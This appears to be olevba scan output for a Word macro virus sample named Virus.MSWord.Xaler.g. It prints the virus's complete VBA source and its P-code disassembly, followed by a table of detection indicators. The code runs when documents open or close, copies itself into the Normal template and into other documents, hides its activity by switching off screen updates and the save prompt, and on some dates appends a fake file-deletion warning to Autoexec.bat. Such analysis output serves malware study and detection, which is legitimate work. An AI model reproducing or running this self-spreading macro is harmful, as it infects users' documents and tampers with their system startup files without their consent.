olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Xaler.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Xaler.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'RELAX
Private Sub RELAX2()
Public Sub ToolsMacro()
Rem RELAX
End Sub
Public Sub ViewVBcode()
End Sub
Public Sub ToolsMacro()
Rem RELAX
End Sub
Public Sub ViewVBcode()
End Sub
If Day(Date) Mod 10 = 0 And Month(Date) Mod 4 = 0 Then
Open "C:\Autoexec.bat" For Append As #1
Print #1, "Cls"
Print #1, "@ECHO OFF"
Print #1, "ECHO NOTE!!!"
Print #1, "ECHO ***"
Print #1, "ECHO *****"
Print #1, "ECHO *******"
Print #1, "ECHO *****"
Print #1, "ECHO ***"
Print #1, "ECHO Sometimes you must RELAX."
Print #1, "ECHO Please, RELAX while deleting all files in C:\"
Print #1, "ECHO *****"
Print #1, "ECHO *******"
Print #1, "ECHO *****"
Print #1, "ECHO GREECE"
Print #1, "ECHO =================================="
Print #1, "PAUSE"
Print #1, "CLS"
Print #1, "ECHO All files deleted!!!"
Print #1, "ECHO Now, you have a clean COMPUTER."
Print #1, "ECHO *******"
Print #1, "ECHO *******"
Print #1, "PAUSE"
Print #1, "@ECHO ON"
Close #1
End If
End Sub

Private Sub Document_Close()
Call GOODSub
Call RELAX2
End Sub

Private Sub GOODSub()
On Error Resume Next
Application.ScreenUpdating = False
Application.Options.SaveNormalPrompt = False
x$ = "C:\temp.tmp"
MacroContainer.VBProject.vbcomponents.Item("ThisDocument").Export x$
Open x$ For Input As #1
keimeno = Input(LOF(1), 1)
Close #1
kk& = InStr(1, keimeno, "'RELAX")
keimeno = Right$(keimeno, Len(keimeno) - kk& + 1)
For j = 1 To 2
If j = 1 Then
NormalTemplate.VBProject.vbcomponents.Item("ThisDocument").Export x$
Else
ActiveDocument.VBProject.vbcomponents.Item("ThisDocument").Export x$
End If
Open x$ For Input As #1
rlx = Input(LOF(1), 1)
Close #1
d1 = InStr(1, rlx, "'RELAX")
If d1 = 0 Then
If j = 1 Then
With NormalTemplate.VBProject.vbcomponents.Item("ThisDocument")
.CodeModule.InsertLines 1, keimeno
.CodeModule.InsertLines 3, "Public Sub ToolsMacro()"
.CodeModule.InsertLines 4, "REM RELAX"
.CodeModule.InsertLines 5, "End Sub"
.CodeModule.InsertLines 6, "Public Sub ViewVBcode()"
.CodeModule.InsertLines 7, "End Sub"
End With
NormalTemplate.Save
Else
ActiveDocument.VBProject.vbcomponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
End If
End If
Next j
'====================
Dim PRostasia As Byte
PRostasia = 1
fff = FreeFile
If Dir(ActiveDocument.FullName, 6) <> "" Then
Open ActiveDocument.FullName For Binary As #fff
Put #fff, 862, PRostasia
Close #fff
ActiveDocument.Save
End If
Kill x$
Application.ScreenUpdating = True
End Sub

Private Sub Document_Open()
Call GOODSub
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Xaler.g
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6133 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0005 "RELAX"
' Line #1:
' 	FuncDefn (Private Sub RELAX2())
' Line #2:
' 	FuncDefn (Public Sub ToolsMacro())
' Line #3:
' 	Rem 0x0006 " RELAX"
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Public Sub ViewVBcode())
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Public Sub ToolsMacro())
' Line #8:
' 	Rem 0x0006 " RELAX"
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Public Sub ViewVBcode())
' Line #11:
' 	EndSub 
' Line #12:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #13:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "Cls"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO NOTE!!!"
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ECHO ***"
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ECHO *****"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO *******"
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ECHO *****"
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ECHO ***"
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "ECHO Sometimes you must RELAX."
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "ECHO Please, RELAX while deleting all files in C:\"
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ECHO *****"
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO *******"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "ECHO *****"
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "ECHO GREECE"
' 	PrintItemNL 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ECHO =================================="
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "PAUSE"
' 	PrintItemNL 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "ECHO All files deleted!!!"
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "ECHO Now, you have a clean COMPUTER."
' 	PrintItemNL 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO *******"
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ECHO *******"
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "PAUSE"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "@ECHO ON"
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndSub 
' Line #40:
' Line #41:
' 	FuncDefn (Private Sub Document_Close())
' Line #42:
' 	ArgsCall (Call) GOODSub 0x0000 
' Line #43:
' 	ArgsCall (Call) RELAX2 0x0000 
' Line #44:
' 	EndSub 
' Line #45:
' Line #46:
' 	FuncDefn (Private Sub GOODSub())
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #49:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #50:
' 	LitStr 0x000B "C:\temp.tmp"
' 	St x$ 
' Line #51:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #52:
' 	Ld x$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #53:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input$ 0x0002 
' 	St keimeno 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St kk& 
' Line #56:
' 	Ld keimeno 
' 	Ld keimeno 
' 	FnLen 
' 	Ld kk& 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Right$ 0x0002 
' 	St keimeno 
' Line #57:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #58:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #60:
' 	ElseBlock 
' Line #61:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld x$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #64:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input$ 0x0002 
' 	St rlx 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #66:
' 	LitDI2 0x0001 
' 	Ld rlx 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St d1 
' Line #67:
' 	Ld d1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #68:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #69:
' 	StartWithExpr 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	With 
' Line #70:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	MemLdWith CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #71:
' 	LitDI2 0x0003 
' 	LitStr 0x0017 "Public Sub ToolsMacro()"
' 	MemLdWith CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #72:
' 	LitDI2 0x0004 
' 	LitStr 0x0009 "REM RELAX"
' 	MemLdWith CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #73:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	MemLdWith CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #74:
' 	LitDI2 0x0006 
' 	LitStr 0x0017 "Public Sub ViewVBcode()"
' 	MemLdWith CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #75:
' 	LitDI2 0x0007 
' 	LitStr 0x0007 "End Sub"
' 	MemLdWith CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #76:
' 	EndWith 
' Line #77:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #78:
' 	ElseBlock 
' Line #79:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	QuoteRem 0x0000 0x0014 "===================="
' Line #84:
' 	Dim 
' 	VarDefn PRostasia (As Byte)
' Line #85:
' 	LitDI2 0x0001 
' 	St PRostasia 
' Line #86:
' 	Ld Friend 
' 	St fff 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #88:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld fff 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #89:
' 	Ld fff 
' 	Sharp 
' 	LitDI2 0x035E 
' 	Ld PRostasia 
' 	PutRec 
' Line #90:
' 	Ld fff 
' 	Sharp 
' 	Close 0x0001 
' Line #91:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Ld x$ 
' 	ArgsCall Kill 0x0001 
' Line #94:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #95:
' 	EndSub 
' Line #96:
' Line #97:
' 	FuncDefn (Private Sub Document_Open())
' Line #98:
' 	ArgsCall (Call) GOODSub 0x0000 
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' Line #102:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

